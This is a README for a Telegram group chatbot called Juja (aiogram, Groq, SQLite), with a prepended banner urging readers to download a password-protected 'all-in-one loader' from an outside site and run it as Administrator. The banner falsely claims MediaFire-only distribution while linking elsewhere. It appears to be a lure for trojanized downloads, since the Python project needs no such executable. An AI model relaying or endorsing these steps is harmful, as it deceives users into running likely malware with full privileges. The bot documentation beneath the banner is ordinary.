<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Juja

Telegram group companion bot: **aiogram 3**, **Groq** (Llama 3.x), **SQLite** for rolling history and per-user facts. Ukrainian-first persona; mirrors RU/EN when others write that way. Fits a small VPS (long polling, no inbound ports).

## Features

- Allowlisted group chats only (other chats are ignored).
- Replies on: reply to bot, `@username`, nickname substring, or random roll (`RANDOM_REPLY_PROB`).
- SQLite memory: last N messages + LLM-extracted facts per user.
- Proactive messages (smart model): APScheduler every N minutes, daily cap, quiet hours, silence / “hot thread” rules.
- Admin commands (owner Telegram user IDs): `/stats`, `/shutup`, `/wake`, `/persona`.

## Quickstart (local)

1. **Python 3.12+**

## Configuration reference

| Variable | Meaning |
|----------|---------|
| `TELEGRAM_BOT_TOKEN` | Bot token from BotFather |
| `GROQ_API_KEY` | Groq API key |
| `OWNER_USER_IDS` | Comma-separated Telegram user ids allowed to use admin commands |
| `ALLOWED_CHAT_IDS` | Comma-separated group/supergroup ids the bot listens to |
| `BOT_NICKNAMES` | Comma-separated substrings that trigger a reply (case-insensitive) |
| `DATABASE_PATH` | SQLite file path |
| `TIMEZONE` | IANA zone for quiet hours and daily reset (e.g. `Europe/Kyiv`) |
| `RANDOM_REPLY_PROB` | 0–1, chance to reply to a normal message |
| `MESSAGE_WINDOW_SIZE` | Recent messages loaded into context |
| `FACT_EXTRACT_EVERY_N_MSGS` | Run fact extraction every N stored messages |
| `PROACTIVE_ENABLED` | `true` / `false` |
| `PROACTIVE_INTERVAL_MINUTES` | Scheduler tick interval per chat |
| `PROACTIVE_MAX_PER_DAY` | Max proactive sends per chat per local day |
| `PROACTIVE_SILENCE_HOURS` | If chat silent this long, proactive may fire |
| `PROACTIVE_INTERJECT_AFTER_MESSAGES` | If this many user messages since last bot message, proactive may fire |
| `QUIET_HOURS` | `HH-HH` local hours (end exclusive when start < end), or overnight e.g. `22-06` |
| `MODEL_FAST` / `MODEL_SMART` | Groq model ids |

## Admin commands

Use in an **allowlisted** group (or from DM is limited for `/stats` — prefer the group).

| Command | Effect |
|---------|--------|
| `/stats` | Shows DB message count, facts count, proactive daily usage |
| `/shutup` | Bot stops replying (still stores messages) |
| `/wake` | Re-enable replies |
| `/persona` | `/persona` clears extra persona; `/persona …` sets extra style hints |

## Deploy (Vultr 1 GB, Ubuntu 24)

- **Firewall**: allow SSH only; bot uses **outbound HTTPS** (Telegram + Groq), no inbound ports.

- **Systemd** (see `deploy/juja-bot.service`):

  - `MemoryMax=400M` leaves RAM headroom on a 1 GB instance.
  - `EnvironmentFile=/etc/juja/bot.env` — copy from `.env.example`, `chmod 600`.

- **Install script** (as root, after cloning):

  ```bash
  export REPO_URL='git@github.com:org/juja.git'   # optional
  sudo bash deploy/install.sh
  sudo install -m 600 .env /etc/juja/bot.env      # adjust paths
  sudo systemctl start juja-bot
  sudo journalctl -u juja-bot -f
  ```

- **Paths** in the unit file assume code at `/home/juja/juja` and venv at `/home/juja/juja/.venv`. Change `User=` / paths if you differ.

## Troubleshooting

- **Bot silent**: check `ALLOWED_CHAT_IDS`, `/shutup`, Groq key, and journald logs.
- **429 / rate limits**: lower `PROACTIVE_MAX_PER_DAY`, `RANDOM_REPLY_PROB`, or increase `PROACTIVE_INTERVAL_MINUTES`.
- **Wrong language**: persona asks to mirror chat language; adjust prompts in `src/juja/llm/prompts.py`.
- **SQLite locked**: single process only; don’t run two instances on the same `DATABASE_PATH`.

## Development

```bash
make test    # pytest
make lint    # ruff
make fmt     # ruff format + fix
```

## License

Internal / project default — add a license file if you open-source the repo.


---

MIT License

Copyright (c) 2026 Dmytro Kaliuzhnyi

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
